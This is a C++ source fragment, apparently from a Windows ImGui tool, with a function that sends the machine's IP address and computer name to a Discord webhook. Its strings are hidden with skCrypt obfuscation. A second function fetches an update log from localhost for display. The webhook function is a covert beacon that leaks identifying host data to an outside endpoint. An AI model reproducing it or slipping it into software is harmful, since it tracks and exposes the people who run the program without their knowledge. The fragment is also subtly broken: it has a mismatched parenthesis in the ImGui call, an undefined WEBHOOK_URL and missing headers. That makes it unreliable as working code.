#include <windows.h>

#include <iphlpapi.h>
#include <curl/curl.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libcurl.lib")

void sendDiscordNotification(const std::string& ipAddress, const std::string& computerName) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        std::string message = skCrypt("IP Address: ").decrypt() + ipAddress + skCrypt("\nComputer Name: ").decrypt() + computerName;

        
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, (skCrypt("{\"content\": \"").decrypt() + message + skCrypt("\"}").decrypt()).c_str());

       
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, skCrypt("curl_easy_perform() failed: %s\n").decrypt(), curl_easy_strerror(res));
        }

       
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

size_t WriteCallback1(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}


std::string fetchData(const std::string& url) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback1);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return readBuffer;
}
int main() {
//Code such as imgui is omitted.
std::string data = fetchData("http://localhost:8080/update_log");

ImGui::status_list(data.c_str(), ""), ImVec2(150, 100), NULL);

  

}

